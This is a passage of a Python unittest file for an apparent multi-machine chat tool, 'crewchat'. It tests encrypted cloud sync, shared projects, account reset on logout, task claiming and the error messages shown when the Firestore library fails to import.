            for m in (self.a, self.b):
                texts.append("%s, while the laptop was off: %d" % (m.device.name, i))
                m.say("all", texts[-1])
        wait_until(lambda: all(self.a.has(t) and self.b.has(t) for t in texts), message="the other two to have them")
        for doc_id, _ in self.store.list("messages"):  # three days on: the cloud has dropped them
            self.store.delete("messages/" + doc_id)
        self.a.sync.renew_lease()  # the mac coordinates: it has the windows machine's messages too, and serves them
        self.assertTrue(self.a.sync.coordinator()["me"])
        self.c.sync.marks["synced_to"] = time.time() - 3 * 86400
        self.c.sync._save_marks()
        self.c.sync = cloud.CloudSync(self.c.hub, self.c.link, self.c.device, log=lambda text: None).start()
        wait_until(lambda: all(self.c.has(t) for t in texts), timeout=30, message="the laptop to catch up")
        with self.c.hub.lock:
            got = [m for m in self.c.hub.messages if m["text"] in texts]
        self.assertEqual(sorted(m["text"] for m in got), sorted(texts))  # each once
        self.assertEqual({m["origin"] for m in got}, {self.a.device.id, self.b.device.id})  # each from its own machine

    def test_a_file_shared_on_one_opens_on_both_others(self):
        data = os.urandom(200 * 1024)
        meta = self.a.hub.add_file("trace.log", data, "text/plain")
        self.a.hub.send(crewchat.OWNER, "all", "the trace", files=[meta])
        for m in (self.b, self.c):
            wait_until(lambda: m.has("the trace"), message="%s to get the message" % m.device.name)
        wait_until(lambda: self.store.get("files/%s-%d" % (meta["id"], -(-len(data) // cloud.FILE_PART) - 1)),
                   message="the last piece")
        for m in (self.b, self.c):
            self.assertEqual(m.hub.open_file(meta["id"])[1].read_bytes(), data)


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class FreshStart(unittest.TestCase):
    def test_when_the_last_machine_leaves_the_next_one_founds_the_account_afresh(self):
        store = cloud.MemoryStore()
        a, b = Machine(store, "mac"), Machine(store, "windows")
        a.account.approve("windows", expect_fp=b.device.fp)
        wait_until(lambda: b.device.ready, message="the approval")
        a.say("all", "before anyone leaves")
        wait_until(lambda: b.has("before anyone leaves"))
        b.account.remove(b.device.id)  # one machine leaves: the account carries on
        self.assertIsNotNone(store.get("meta/account"))
        a.account.remove(a.device.id)  # the last one leaves: nothing anyone can read is left
        self.assertEqual([p for p in store.docs if not p.startswith("meta/")], [])
        self.assertIsNone(store.get("meta/account"))
        self.assertIsNone(store.get("meta/trust"))
        c = Machine(store, "new-laptop")
        self.assertEqual(c.result, "founded")  # not left waiting for an approval no one can give
        self.assertTrue(c.device.ready)
        for m in (a, b, c):
            m.stop()

    def test_an_account_whose_last_machine_left_without_clearing_it_is_founded_afresh(self):
        store = cloud.MemoryStore()
        a = Machine(store, "mac")
        a.say("all", "left behind")
        wait_until(lambda: any(p.startswith("messages/") for p in store.docs), message="the publish")
        a.stop()
        # What crewchat 0.11.0 left, or a reset cut off: no trusted device, the rest still there.
        a.account._change_trust(lambda devices: {})
        store.delete("devices/" + a.device.id)
        c = Machine(store, "new-laptop")
        self.assertEqual(c.result, "founded")
        self.assertTrue(c.device.ready)
        self.assertEqual([p for p in store.docs if p.startswith("messages/")], [])
        c.stop()


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class SharedProjects(unittest.TestCase):
    """Projects besides the first are shared by name over cloud sync too: t3 on the Mac and t3 on
    Windows are one chat."""

    @classmethod
    def setUpClass(cls):
        cls.store = cloud.MemoryStore()
        cls.a, cls.b = Machine(cls.store, "mac"), Machine(cls.store, "windows")
        cls.a.account.approve("windows", expect_fp=cls.b.device.fp)
        wait_until(lambda: cls.b.device.ready, message="the approval")
        for m, names in ((cls.a, ("t3", "solo")), (cls.b, ("t3", "other"))):
            for name in names:
                crewchat.create_project(name, m.root)
            m.projects.refresh()
            crewchat.link_projects(m.projects)

    @classmethod
    def tearDownClass(cls):
        for m in (cls.a, cls.b):
            m.stop()

    def hub(self, machine, name):
        return machine.projects.get(crewchat.project_id(name)).hub

    def test_machines_status_over_cloud_sync(self):
        # M1/M2: version, OS and projects travel sealed in the first project's state: never a name in clear.
        def row():
            return next((r for r in self.b.sync.machines_status() if r["name"] == "mac"), {})
        wait_until(lambda: row().get("version"), message="windows to have the mac's info")
        mac = row()
        self.assertEqual((mac["version"], mac["os"], mac["state"]), (crewchat.__version__, crewchat.os_name(), "online"))
        self.assertTrue({("t3", False), ("solo", False)} <= {(p["name"], p["first"]) for p in mac["projects"]})
        self.assertEqual(mac["fp"], self.a.device.fp)
        self.assertNotIn("solo", json.dumps(self.store.docs, default=str))

    def test_offered_over_cloud_sync(self):
        crewchat.create_project("cloud-new", self.a.root)
        self.a.projects.refresh()
        offer = wait_until(lambda: next((o for o in crewchat.offered(self.b.projects) if o["name"] == "cloud-new"), None),
                           message="windows to be offered cloud-new")
        self.assertEqual(offer["machines"], ["mac"])

    def test_every_projects_page_names_the_coordinator(self):
        # Machines coordinate as a whole, through the machine's link: a project's page says who, as the first's does.
        self.a.sync.renew_lease()
        self.assertTrue(self.hub(self.a, "t3").sync.coordinator()["me"])
        self.assertEqual(self.hub(self.b, "t3").sync.coordinator()["name"], "mac")

    def test_a_project_with_the_same_name_is_one_chat(self):
        a3, b3 = self.hub(self.a, "t3"), self.hub(self.b, "t3")
        writer = a3.agent_for(a3.open_session("mac", "claude"))
        reader = b3.agent_for(b3.open_session("windows", "claude"))
        wait_until(lambda: any(r["agent"] == writer for r in b3.rows()), message="windows' t3 to see the mac's agent")
        a3.send(writer, "all", "hello t3")
        wait_until(lambda: any(m["text"] == "hello t3" for m in b3.messages), message="windows' t3 to get it")
        self.assertIn("hello t3", [m["text"] for m in b3.inbox(reader, 0, True)])
        for hub in (a3, b3):  # each machine's chat says so, once
            self.assertEqual(sum("now shared" in m["text"] for m in hub.messages), 1)
        b3.send(reader, "all", "and back")
        wait_until(lambda: any(m["text"] == "and back" for m in a3.messages), message="the mac's t3 to get the reply")
        # Nothing crosses into another project, either way.
        self.a.say("all", "first project only")
        wait_until(lambda: self.b.has("first project only"), message="the first projects")
        time.sleep(0.3)
        self.assertFalse(any(m["text"] == "first project only" for m in b3.messages))
        self.assertFalse(self.b.has("hello t3"))

    def test_one_task_one_taker_in_a_shared_project(self):
        a3, b3 = self.hub(self.a, "t3"), self.hub(self.b, "t3")
        x = a3.agent_for(a3.open_session("mac", "claude"))
        y = b3.agent_for(b3.open_session("windows", "claude"))
        task = a3.add_row(crewchat.OWNER, "one owner for this")
        wait_until(lambda: task["id"] in b3.sheet, message="the task on windows' sheet")
        results = {}

        def take(hub, agent):
            try:
                hub.take(agent, task["id"])
                results[agent] = "won"
            except crewchat.HubError as e:
                results[agent] = str(e)
        threads = [threading.Thread(target=take, args=pair) for pair in ((a3, x), (b3, y))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        winners = [k for k, v in results.items() if v == "won"]
        self.assertEqual(len(winners), 1, results)
        for hub in (a3, b3):
            wait_until(lambda: hub.taken.get(task["id"]) == winners[0], message="both to agree")
        self.assertNotIn(task["id"], self.a.hub.taken)  # the first project's claims are apart

    def test_a_project_only_one_machine_has_stays_there_and_is_not_marked_shared(self):
        solo = self.hub(self.a, "solo")
        solo.send(crewchat.OWNER, "all", "only on the mac")
        wait_until(lambda: self.hub(self.a, "t3").sync.shared, message="t3 to be shared")
        time.sleep(0.3)
        self.assertFalse(solo.sync.shared)
        for name in ("t3", "other"):
            self.assertFalse(any(m["text"] == "only on the mac" for m in self.hub(self.b, name).messages))

    def test_a_project_made_later_is_shared_at_once(self):
        for m in (self.a, self.b):
            crewchat.create_project("late", m.root)
            m.projects.all()  # the server notices the new folder on its next request
        a4, b4 = self.hub(self.a, "late"), self.hub(self.b, "late")
        a4.send(crewchat.OWNER, "all", "late but shared")
        wait_until(lambda: any(m["text"] == "late but shared" for m in b4.messages), message="the late project")

    def test_the_chat_page_says_cloud_sync(self):
        link = crewchat.link_info(self.a.hub)
        self.assertEqual((link["via"], link["me"], link["approved"]), ("cloud", "mac", True))

    def test_project_names_never_reach_the_cloud(self):
        self.hub(self.a, "solo").send(crewchat.OWNER, "all", "a secret project")
        wait_until(lambda: any("/messages/" in p and p.startswith("spaces/") for p in self.store.docs),
                   message="a project's message in the cloud")
        for path in list(self.store.docs):
            for name in ("t3", "solo", "other", "late"):
                self.assertNotIn(name, path)


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class SharedProjectsReset(unittest.TestCase):
    def test_the_last_logout_clears_every_project_too(self):
        store = cloud.MemoryStore()
        a = Machine(store, "mac")
        crewchat.create_project("t3", a.root)
        a.projects.refresh()
        crewchat.link_projects(a.projects)
        a.projects.get("t3").hub.send(crewchat.OWNER, "all", "in t3")
        wait_until(lambda: any(p.startswith("spaces/") and "/messages/" in p for p in store.docs),
                   message="t3's message in the cloud")
        a.stop()
        a.account.remove(a.device.id)
        self.assertEqual(list(store.docs), [])


@unittest.skipUnless(HAVE_CRYPTO, "needs the cryptography library")
class LogoutFromThePage(unittest.TestCase):
    def test_signing_out_stops_the_link(self):
        # Release review (E5): the running link went on sending under the removed machine's id, and filled the cloud
        # again after the last machine's logout had emptied it.
        store = cloud.MemoryStore()
        a = Machine(store, "mac")
        self.addCleanup(a.stop)
        a.say("all", "before")
        wait_until(lambda: any(p.startswith("messages/") for p in store.docs), message="the message in the cloud")
        cloud.page_op(a.hub, a.root, "cloud-logout", {}, True)
        self.assertIsNone(a.hub.sync)
        self.assertTrue(a.sync.stopping())
        self.assertEqual(list(store.docs), [])  # the last machine: the account is gone
        a.say("all", "after")
        time.sleep(1)
        self.assertEqual(list(store.docs), [])


class LogoutFromTheCommandLine(unittest.TestCase):
    def test_the_running_server_signs_out(self):
        # Release review (E5): `crewchat cloud logout` removed the machine while the running server went on syncing.
        said = []
        with mock.patch.object(crewchat, "post_json", side_effect=lambda url, token, body, **kw: said.append(body) or
                               {"signed_out": True}), \
                mock.patch.object(crewchat, "owner_token", return_value="owner"), \
                mock.patch.object(crewchat, "local_url", return_value="http://127.0.0.1:9"), \
                mock.patch.object(cloud, "logout", side_effect=AssertionError("signed out here, not by the server")), \
                mock.patch("sys.stdout", io.StringIO()) as out:
            cloud._cmd_cloud(argparse.Namespace(action="logout"))
        self.assertEqual(said, [{"op": "cloud-logout"}])
        self.assertIn("stopped syncing", out.getvalue())
        with mock.patch.object(crewchat, "post_json", side_effect=urllib.error.URLError("refused")), \
                mock.patch.object(crewchat, "owner_token", return_value="owner"), \
                mock.patch.object(cloud, "logout") as here, mock.patch("sys.stdout", io.StringIO()):
            cloud._cmd_cloud(argparse.Namespace(action="logout"))  # no server: signed out here, as before
        here.assert_called_once()


class FirestoreImport(unittest.TestCase):
    """What `crewchat cloud` says when Google's library cannot be loaded."""

    def test_a_missing_library_says_how_to_install_it(self):
        e = ModuleNotFoundError("No module named 'google'", name="google")
        self.assertIn('pip install "crewchat[cloud]"', cloud.firestore_import_error(e))

    def test_smart_app_control_says_to_use_a_signed_python(self):
        e = ImportError("DLL load failed while importing _overlapped: "
                        "An Application Control policy has blocked this file.")
        msg = cloud.firestore_import_error(e)
        self.assertIn("Smart App Control", msg)
        self.assertIn("--python-preference only-system", msg)

    def test_any_other_failure_shows_the_error(self):
        e = ImportError("DLL load failed while importing cygrpc: something else")
        msg = cloud.firestore_import_error(e)
        self.assertIn("cygrpc", msg)
        self.assertNotIn("pip install", msg)


def tearDownModule():
    shutil.rmtree(TMP, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
